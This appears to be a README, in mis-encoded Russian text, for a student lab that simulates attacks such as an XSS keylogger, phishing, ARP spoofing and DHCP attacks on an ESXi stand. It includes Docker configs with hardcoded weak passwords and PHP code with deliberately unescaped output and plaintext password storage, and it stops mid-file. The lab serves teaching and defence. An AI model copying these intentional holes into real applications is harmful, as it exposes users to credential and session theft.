<h1 align="center">Stand ESXi for Cyber Attacks</h1>
<p align="center">
  <em>–î–∏–ø–ª–æ–º–Ω–∞—è —Ä–∞–±–æ—Ç–∞ (2025) –ø–æ –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—é ¬´–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω–∞—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å¬ª</em><br>
  <strong>–ü—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏–π —Å—Ç–µ–Ω–¥ –Ω–∞ –±–∞–∑–µ VMware ESXi –¥–ª—è –º–æ–¥–µ–ª–∏—Ä–æ–≤–∞–Ω–∏—è –∏ –æ—Ç—Ä–∞–±–æ—Ç–∫–∏ –∫–∏–±–µ—Ä–∞—Ç–∞–∫, —Å–µ—Ç–µ–≤—ã—Ö –∞—Ç–∞–∫ —Å –æ–ø–∏—Å–∞–Ω–∏–µ–º –∑–∞—â–∏—Ç–Ω—ã—Ö –º–µ—Ä</strong>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Windows-10-0078D6?logo=windows&logoColor=white" alt="Windows 10">
  <img src="https://img.shields.io/badge/VMware-ESXi-555?logo=vmware&logoColor=white" alt="VMware ESXi">
  <img src="https://img.shields.io/badge/Docker-Engine-2496ED?logo=docker&logoColor=white" alt="Docker">
  <img src="https://img.shields.io/badge/Debian-GNU%2FLinux-A81D33?logo=debian&logoColor=white" alt="Debian">
  <br>
  <img src="https://img.shields.io/badge/Kali-Linux-557C94?logo=kalilinux&logoColor=white" alt="Kali Linux">
  <img src="https://img.shields.io/badge/Ubuntu-Server-E95420?logo=ubuntu&logoColor=white" alt="Ubuntu">
  <img src="https://img.shields.io/badge/PostgreSQL-DB-336791?logo=postgresql&logoColor=white" alt="PostgreSQL">
  <img src="https://img.shields.io/badge/MikroTik-RouterOS-9B9B9B" alt="MikroTik">
</p>

---

## üß≠ –û –ø—Ä–æ–µ–∫—Ç–µ

**Stand ESXi for Cyber Attacks** ‚Äî —ç—Ç–æ —É—á–µ–±–Ω–æ-–ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏–π —Å—Ç–µ–Ω–¥ –Ω–∞ –±–∞–∑–µ –≥–∏–ø–µ—Ä–≤–∏–∑–æ—Ä–∞ **VMware ESXi**, –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–Ω—ã–π –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –º–æ–¥–µ–ª–∏—Ä–æ–≤–∞–Ω–∏—è —Ä–µ–∞–ª—å–Ω—ã—Ö –∞—Ç–∞–∫, —Å –æ–ø–∏—Å–∞–Ω–∏–µ–º –∑–∞—â–∏—Ç–Ω—ã—Ö –º–µ—Ä.  
–°—Ç–µ–Ω–¥ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ–±—É—á–µ–Ω–∏—è, –ø—Ä–æ–≤–µ—Ä–∫–∏ –≥–∏–ø–æ—Ç–µ–∑, –æ—Ç—Ä–∞–±–æ—Ç–∫–∏ —Ä–µ–∞–≥–∏—Ä–æ–≤–∞–Ω–∏—è –∏ –∞–Ω–∞–ª–∏–∑–∞ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–æ–≤ –≤ –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º–æ–π —Å—Ä–µ–¥–µ.

**–ü–µ—Ä–∏–æ–¥ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏:** –∞–ø—Ä–µ–ª—å ‚Äì –∏—é–Ω—å 2025 –≥–æ–¥–∞.  
**–ö–ª—é—á–µ–≤—ã–µ –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è:** Blue Team, Red Team, —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π, –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è —Ä–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–Ω–∏—è –∏ —á—É—Ç—å-—á—É—Ç—å —Å–µ—Ç–∏ ^^.

---

## üîç Common Weakness Enumeration

–í —Ö–æ–¥–µ —Ä–∞–±–æ—Ç—ã –±—ã–ª–∏ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω—ã –∏ –∏–∑—É—á–µ–Ω—ã —Å–ª–µ–¥—É—é—â–∏–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏ –∞—Ç–∞–∫:

1. **Keylogger (CWE-79)** ‚Äî –≤–Ω–µ–¥—Ä–µ–Ω–∏–µ JS —á–µ—Ä–µ–∑ XSS –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –Ω–∞–∂–∞—Ç–∏–π –∫–ª–∞–≤–∏—à.
2. **Phishing (CWE-79)** ‚Äî –ø–æ–¥–º–µ–Ω–∞ —Ñ–æ—Ä–º—ã –ª–æ–≥–∏–Ω–∞ —á–µ—Ä–µ–∑ XSS –∏ –∫—Ä–∞–∂–∞ —É—á—ë—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö.
3. **Stealer (CWE-200)** ‚Äî —ç–º—É–ª—è—Ü–∏—è –ø–æ—Ö–∏—â–µ–Ω–∏—è –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã—Ö –∏ –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö.
4. **Docker Escape (CVE-2022-0492)** ‚Äî –≤—ã—Ö–æ–¥ –∑–∞ –ø—Ä–µ–¥–µ–ª—ã –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ —Å –¥–æ—Å—Ç—É–ø–æ–º –∫ —Ö–æ—Å—Ç—É.
5. **DHCP Starvation & Rogue DHCP (CWE-346)** ‚Äî –∏—Å—á–µ—Ä–ø–∞–Ω–∏–µ –ø—É–ª–∞ –∞–¥—Ä–µ—Å–æ–≤ –∏ —Ä–∞–∑–¥–∞—á–∞ –ª–æ–∂–Ω—ã—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –¥–ª—è MITM.
6. **ARP Spoofing (CWE-345)** ‚Äî –ø–æ–¥–º–µ–Ω–∞ ARP-–∑–∞–ø–∏—Å–µ–π –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ —Ç—Ä–∞—Ñ–∏–∫–∞.
7. **Brute-force (CWE-307)** ‚Äî –ø–µ—Ä–µ–±–æ—Ä –ø–∞—Ä–æ–ª–µ–π –¥–ª—è –Ω–µ—Å–∞–Ω–∫—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞.
8. **QRLJacking (CWE-285)** ‚Äî –∑–∞—Ö–≤–∞—Ç —Å–µ—Å—Å–∏–∏ —á–µ—Ä–µ–∑ –ø–æ–¥–º–µ–Ω—É QR-–∫–æ–¥–∞.

---

## üéØ –¶–µ–ª–∏ –ø—Ä–æ–µ–∫—Ç–∞

–†–∞–∑—Ä–∞–±–æ—Ç–∞—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º–Ω—ã–π —Å—Ç–µ–Ω–¥ –¥–ª—è –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—è –∫–∏–±–µ—Ä—É—á–µ–Ω–∏–π –ø–æ –∑–∞—â–∏—Ç–µ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ –æ—Ç –∫–∏–±–µ—Ä–∞—Ç–∞–∫. –°—Ç–µ–Ω–¥ –ø–æ–∑–≤–æ–ª–∏—Ç –º–æ–¥–µ–ª–∏—Ä–æ–≤–∞—Ç—å –∞–∫—Ç—É–∞–ª—å–Ω—ã–µ —É–≥—Ä–æ–∑—ã –∏ –æ—Ç—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å –º–µ—Ç–æ–¥—ã –∑–∞—â–∏—Ç—ã, —á—Ç–æ –ø–æ–≤—ã—Å–∏—Ç –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç—å –ø–µ—Ä—Å–æ–Ω–∞–ª–∞ –∫ –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–º—É –≤—ã—è–≤–ª–µ–Ω–∏—é –∏ –Ω–µ–π—Ç—Ä–∞–ª–∏–∑–∞—Ü–∏–∏ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö —É–≥—Ä–æ–∑.

---

## üèó –°–æ—Å—Ç–∞–≤ –∏ —Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç–µ–Ω–¥–∞

**–ê–ø–ø–∞—Ä–∞—Ç–Ω–∞—è –±–∞–∑–∞:** —Å–µ—Ä–≤–µ—Ä Supermicro  
- CPU: 2√ó Intel Xeon Silver 4216 (2.10 GHz)  
- RAM: 256 GB DDR4  
- NIC: 2√ó Intel Ethernet X722  
- SSD: 4 –¢–ë  
- HDD: 2 –¢–ë  
- RAID: MegaRAID SAS + Lewisburg SATA  

**–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞:** VMware ESXi (–æ—Å–Ω–æ–≤–Ω–æ–π –≥–∏–ø–µ—Ä–≤–∏–∑–æ—Ä)  
–ù–∞ ESXi —Ä–∞–∑–≤—ë—Ä–Ω—É—Ç –≤–ª–æ–∂–µ–Ω–Ω—ã–π ESXi (16vCPU, 30 GB, 500 GB) –∫–∞–∫ —É—á–µ–±–Ω—ã–π —Å—Ç–µ–Ω–¥. –í –Ω—ë–º —Å–æ–∑–¥–∞–Ω–æ **8 –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã—Ö –º–∞—à–∏–Ω** –∏ **1 –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã–π –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä**.

---

### –í–∏—Ä—Ç—É–∞–ª—å–Ω—ã–µ –º–∞—à–∏–Ω—ã

1. **Debian 12** ‚Äî –≤–µ–±-—Å–µ—Ä–≤–µ—Ä –∏ –°–£–ë–î  
   - Docker, PHP, Nginx/Apache, PostgreSQL, pgAdmin  
   - –¢–µ—Å—Ç–æ–≤–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —Å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–µ–π, –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–µ–π, –õ–ö  

2. **Windows 10** ‚Äî —Ä–∞–±–æ—á–∞—è —Å—Ç–∞–Ω—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è  
   - –ò–º–∏—Ç–∞—Ü–∏—è –ø–µ—Ä–µ—Ö–æ–¥–∞ –ø–æ —Ñ–∏—à–∏–Ω–≥–æ–≤—ã–º/XSS-—Å—Å—ã–ª–∫–∞–º, QRLJacking  

3. **Kali Linux** ‚Äî —Å–µ—Ç–µ–≤—ã–µ –∞—Ç–∞–∫–∏  
   - ARP spoofing, brute-force  

4. **Kali Linux** ‚Äî –∞—Ç–∞–∫–∏ –Ω–∞ DHCP  
   - DHCP Starvation, Rogue DHCP + MITM  

5. **Debian 12** ‚Äî —É—è–∑–≤–∏–º—ã–π –≤–µ–±-—Å–∞–π—Ç (–º–∏—à–µ–Ω—å)  
   - Docker, –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –¥–ª—è —Ç–µ—Å—Ç–æ–≤ –∞—Ç–∞–∫  

6. **Debian 12** ‚Äî —Å–∞–π—Ç –¥–ª—è DHCP-–∞—Ç–∞–∫ (–º–∏—à–µ–Ω—å)  
   - Docker, —Å–µ—Ä–≤–∏—Å—ã –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞  

7. **Debian 12** ‚Äî ¬´–ø–æ—Ä—Ç–∞–ª –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞¬ª  
   - –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ —Å–∫—Ä–∏–ø—Ç—ã, –ø—Ä–∏—ë–º –¥–∞–Ω–Ω—ã—Ö  

8. **Ubuntu** ‚Äî —Ç–µ—Å—Ç QRLJacking –∏ Docker Escape  

9. **MikroTik RouterOS** ‚Äî –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä/—Ü–µ–ª—å –∞—Ç–∞–∫–∏  
   - DHCP-—Å–µ—Ä–≤–µ—Ä, OSPF, –∂–µ—Ä—Ç–≤–∞ DHCP-–∞—Ç–∞–∫  

---

### –ù–∞ –º–æ–º–µ–Ω—Ç –∑–∞—â–∏—Ç—ã, —Å–∏—Å—Ç–µ–º–Ω—ã–µ —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è –Ω–∞ –í–ú –±—ã–ª–∏:

| –í–ú | CPU | RAM | HDD | –ü—Ä–∏–º–µ—á–∞–Ω–∏—è |
|----|-----|-----|-----|------------|
| Debian (web/db) | 2 vCPU | 2 GB | 30 GB | Docker, PostgreSQL |
| Windows 10 | 2 vCPU | 4 GB | 40 GB | GUI, –±—Ä–∞—É–∑–µ—Ä—ã |
| Kali Linux (—Å–µ—Ç–∏) | 2 vCPU | 2 GB | 40 GB | –∞—Ç–∞–∫–∏ L2/L3 |
| Kali Linux (DHCP) | 2 vCPU | 2 GB | 40 GB | MITM DHCP |
| Debian (–º–∏—à–µ–Ω—å) | 2 vCPU | 2 GB | 30 GB | –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ |
| Debian (DHCP –º–∏—à–µ–Ω—å) | 2 vCPU | 2 GB | 30 GB | —Ç–µ—Å—Ç DHCP |
| Debian (–∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫) | 2 vCPU | 2 GB | 30 GB | —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö |
| Ubuntu | 2 vCPU | 2 GB | 30 GB | Docker Escape, QRLJacking |
| MikroTik | 1 vCPU | 1 GB | 8 GB | RouterOS |

---

**–ò—Ç–æ–≥:** —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ä–æ–ª–µ–π –∏ —Ä–µ—Å—É—Ä—Å–æ–≤ –ø–æ–∑–≤–æ–ª—è–µ—Ç –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç—å –∞—Ç–∞–∫–∏ –æ—Ç L2-—Å–µ—Ç–µ–π –¥–æ –≤–µ–±-—É—Ä–æ–≤–Ω—è –∏ –ø—Ä–æ–≤–µ—Ä—è—Ç—å –º–Ω–æ–≥–æ—É—Ä–æ–≤–Ω–µ–≤—É—é –∑–∞—â–∏—Ç—É –≤ —É—Å–ª–æ–≤–∏—è—Ö, –ø—Ä–∏–±–ª–∏–∂—ë–Ω–Ω—ã—Ö –∫ —Ä–µ–∞–ª—å–Ω—ã–º.

---

## ‚ö†Ô∏è –î–∏—Å–∫–ª–µ–π–º–µ—Ä

–í—Å–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏ –≤—ã–ø–æ–ª–Ω—è–ª–∏—Å—å –≤ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Ç–µ—Å—Ç–æ–≤–æ–π —Å—Ä–µ–¥–µ –≤ —É—á–µ–±–Ω—ã—Ö —Ü–µ–ª—è—Ö.  
–ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ –ø–æ–¥–æ–±–Ω—ã—Ö —Ç–µ—Ö–Ω–∏–∫ –≤ —Ä–µ–∞–ª—å–Ω–æ–π –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–µ –±–µ–∑ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è —è–≤–ª—è–µ—Ç—Å—è –Ω–∞—Ä—É—à–µ–Ω–∏–µ–º –∑–∞–∫–æ–Ω–∞.

## 1 üñ• –ê—Ç–∞–∫–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞ –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –≤–≤–æ–¥–∞ —Å –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã

**–ú–µ–∂—Å–∞–π—Ç–æ–≤—ã–π —Å–∫—Ä–∏–ø—Ç–∏–Ω–≥ (Cross-Site Scripting, XSS)** ‚Äî —ç—Ç–æ –∫–ª–∞—Å—Å —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–º –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–Ω–µ–¥—Ä—è–µ—Ç –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–π –∫–ª–∏–µ–Ω—Ç—Å–∫–∏–π –∫–æ–¥ –≤ —Å—Ç—Ä–∞–Ω–∏—Ü—É, –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º—É—é –≤ –±—Ä–∞—É–∑–µ—Ä–µ –∂–µ—Ä—Ç–≤—ã. –¢–∞–∫–æ–π –∫–æ–¥ –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –¥–æ–≤–µ—Ä–µ–Ω–Ω–æ–≥–æ –¥–æ–º–µ–Ω–∞ –∏ –ø–æ–ª—É—á–∞–µ—Ç —Ç–µ –∂–µ –ø—Ä–∞–≤–∞, —á—Ç–æ –∏ –ª–µ–≥–∏—Ç–∏–º–Ω—ã–π —Å–∫—Ä–∏–ø—Ç —Å–∞–π—Ç–∞: –¥–æ—Å—Ç—É–ø –∫ DOM, cookies —Å–µ—Å—Å–∏–∏, —Ç–æ–∫–µ–Ω–∞–º –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏, –∞ —Ç–∞–∫–∂–µ –ø–æ–ª—è–º –≤–≤–æ–¥–∞.

–í –¥–∞–Ω–Ω–æ–º —Å—Ü–µ–Ω–∞—Ä–∏–∏ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è —É—è–∑–≤–∏–º–æ—Å—Ç—å **CWE-79**, –ø–æ–∑–≤–æ–ª—è—é—â–∞—è –≤–Ω–µ–¥—Ä–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π JavaScript-–∫–æ–¥, —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É—é—â–∏–π –Ω–∞–∂–∞—Ç–∏—è –∫–ª–∞–≤–∏—à –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –æ—Ç–ø—Ä–∞–≤–ª—è—é—â–∏–π –∏—Ö –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É.

---

### üîπ –õ–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω—ã–π —Å—Ç–µ–Ω–¥

**–¢–∞–±–ª–∏—Ü–∞ 1 ‚Äî –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —Å—Ç–µ–Ω–¥–∞ –¥–ª—è –∞—Ç–∞–∫–∏ keylogger**

| IP-–∞–¥—Ä–µ—Å / –ü–æ—Ä—Ç     | –†–æ–ª—å                | –û–ø–∏—Å–∞–Ω–∏–µ |
|---------------------|--------------------|----------|
| `192.168.0.69:2222` | –í–µ–±-—Å–µ—Ä–≤–µ—Ä          | –°–∞–π—Ç –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏: —Ñ–æ—Ä–º–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏, –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –∏ –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç |
| `192.168.0.69:1111` | pgAdmin4            | –í–µ–±-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏—è PostgreSQL |
| `192.168.0.69:5432` | PostgreSQL          | –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö —Å–∞–π—Ç–∞ |
| `192.168.0.89`      | –ö–ª–∏–µ–Ω—Ç *(Windows 10)*| –ñ–µ—Ä—Ç–≤–∞ –∞—Ç–∞–∫–∏ ‚Äî –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç —Å—Å—ã–ª–∫—É —Å XSS-payload |
| `192.168.0.114:3333`| –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ *(Debian)*| –•–æ—Å—Ç–∏–Ω–≥ `keylogger.php` –∏ –ø—Ä–∏—ë–º –¥–∞–Ω–Ω—ã—Ö (`keylog.txt`) |

---

üí° *–°—Ç–µ–Ω–¥ —Ä–∞–∑–≤—ë—Ä–Ω—É—Ç –≤ –ª–æ–∫–∞–ª—å–Ω–æ–π —Å–µ—Ç–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Docker Compose –∏ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã—Ö –º–∞—à–∏–Ω.*  
–í–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ –Ω–∞ PHP.

---

### üõ† –≠—Ç–∞–ø 1 ‚Äî –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –æ–∫—Ä—É–∂–µ–Ω–∏—è

> –†–∞–∑–≤–æ—Ä–∞—á–∏–≤–∞–µ–º —Å–µ—Ä–≤–µ—Ä–Ω—É—é —á–∞—Å—Ç—å: –≤–µ–±‚Äë–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–∞ PHP + PostgreSQL –≤ Docker. –≠—Ç–æ—Ç —ç—Ç–∞–ø –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è —Ä–∞–±–æ—Ç–æ—Å–ø–æ—Å–æ–±–Ω—ã–º —Å–∞–π—Ç–æ–º (–ø–æ—Ä—Ç `2222`) –∏ pgAdmin (–ø–æ—Ä—Ç `1111`). –í –∫–æ–¥–µ –Ω–∞–º–µ—Ä–µ–Ω–Ω–æ –æ—Å—Ç–∞–≤–ª–µ–Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç—å (—Ç–æ—á–∫–∏ XSS), –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –¥–∞–ª–µ–µ –¥–ª—è keylogger‚Äë—Å—Ü–µ–Ω–∞—Ä–∏—è.

---

## üîß –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –∏ —Ä–æ–ª–∏

* **php (Apache + PHP)** ‚Äî —É—è–∑–≤–∏–º–æ–µ –≤–µ–±‚Äë–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ (–ø–æ—Ä—Ç `2222 ‚Üí 80`).
* **db (PostgreSQL)** ‚Äî –ë–î –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è (–ø–æ—Ä—Ç `5432`).
* **pgadmin (pgAdmin4)** ‚Äî GUI –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏—è –ë–î (–ø–æ—Ä—Ç `1111 ‚Üí 80`).

**–°–µ–≥–º–µ–Ω—Ç —Å–µ—Ç–∏**: DMZ (–≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–µ —Å–≤—è–∑–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤ ‚Äî —á–µ—Ä–µ–∑ Docker‚Äë—Å–µ—Ç—å).
**–ì–¥–µ —É—è–∑–≤–∏–º–æ—Å—Ç—å:** –Ω–µ–∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º—ã–π –≤—ã–≤–æ–¥ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ `payload` –≤ `login.php` –∏ `dashboard.php` (–æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ).

---

## üì¶ C–µ—Ä–≤–µ—Ä–Ω–∞—è —á–∞—Å—Ç—å

```yaml
version: '3.8'

services:
  db:
    image: postgres:latest
    container_name: postgres_db
    environment:
      POSTGRES_USER: 163justIneffable
      POSTGRES_PASSWORD: P@ssw0rd
      POSTGRES_DB: anubis
    volumes:
      - db_data:/var/lib/postgresql/data
    ports:
      - "5432:5432"

  pgadmin:
    image: dpage/pgadmin4:latest
    container_name: pgadmin
    environment:
      PGADMIN_DEFAULT_EMAIL: *mail*@list.ru
      PGADMIN_DEFAULT_PASSWORD: P@ssw0rd!
    ports:
      - "1111:80"
    depends_on:
      - db

  php:
    build:
      context: .
      dockerfile: Dockerfile
    volumes:
      - ./html:/var/www/html
    ports:
      - "2222:80"
    depends_on:
      - db

volumes:
  db_data:
```

### Dockerfile

```dockerfile
FROM php:apache

RUN apt-get update && \
    apt-get install -y libpq-dev && \
    docker-php-ext-install pgsql pdo_pgsql
```

> *–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:* –±–∞–∑–æ–≤—ã–π –æ–±—Ä–∞–∑ `php:apache` —É–∂–µ —Å–æ–¥–µ—Ä–∂–∏—Ç Apache —Å –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–µ–π –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–≥–æ —Ö–æ—Å—Ç–∞ `/var/www/html`.

---

## üóÇ –°—Ç—Ä—É–∫—Ç—É—Ä–∞ –ø—Ä–æ–µ–∫—Ç–∞

```
project-root/
‚îú‚îÄ docker-compose.yml
‚îú‚îÄ Dockerfile
‚îî‚îÄ html/
   ‚îú‚îÄ index.php
   ‚îú‚îÄ register.php
   ‚îú‚îÄ login.php
   ‚îú‚îÄ dashboard.php
   ‚îú‚îÄ logout.php
   ‚îî‚îÄ db.php
```

–°–æ–∑–¥–∞—ë–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –ø–æ–¥ –∫–æ–¥:

```bash
mkdir -p html
```

---

## üíæ PHP‚Äë–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ (—É—è–∑–≤–∏–º—ã–µ —Ç–æ—á–∫–∏ –æ—Ç–º–µ—á–µ–Ω—ã)

### `html/db.php`

```php
<?php
// db.php ‚Äî –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ PostgreSQL —á–µ—Ä–µ–∑ PDO
$host = 'db';         // –∏–º—è —Å–µ—Ä–≤–∏—Å–∞ –ë–î –∏–∑ docker-compose
$port = '5432';
$db   = 'anubis';
$user = '163justIneffable';
$pass = 'P@ssw0rd';

$dsn = "pgsql:host=$host;port=$port;dbname=$db;";

try {
    $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
} catch (PDOException $e) {
    echo "–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î: " . $e->getMessage();
    exit();
}
```

### `html/index.php`

```php
<?php
session_start();
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>–ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞</title>
</head>
<body>
    <h1>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –Ω–∞ —Å–∞–π—Ç</h1>
    <p>
      <a href="register.php">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</a> |
      <a href="login.php">–í—Ö–æ–¥</a>
    </p>
    <?php
      if(isset($_SESSION['username'])) {
          echo "<p>–ü—Ä–∏–≤–µ—Ç, " . $_SESSION['username'] . "!</p>";
          echo '<p><a href="dashboard.php">–ü–µ—Ä–µ–π—Ç–∏ –≤ –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç</a></p>';
      }
    ?>
</body>
</html>
```

### `html/register.php`

```php
<?php
session_start();
require 'db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $bio = $_POST['bio'];

    // ‚ö†Ô∏è –î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–æ–Ω–Ω–æ: –±–µ–∑ —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è (—É—è–∑–≤–∏–º–æ –ø–æ CWE-79)
    $sql = "INSERT INTO users (username, password, bio) VALUES (:username, :password, :bio)";
    $stmt = $pdo->prepare($sql);
    $stmt->bindValue(':username', $username);
    $stmt->bindValue(':password', $password);
    $stmt->bindValue(':bio', $bio);

    try {
        $stmt->execute();
        $_SESSION['username'] = $username;
        header("Location: dashboard.php");
        exit();
    } catch (PDOException $e) {
        echo "–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏: " . $e->getMessage();
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</title>
</head>
<body>
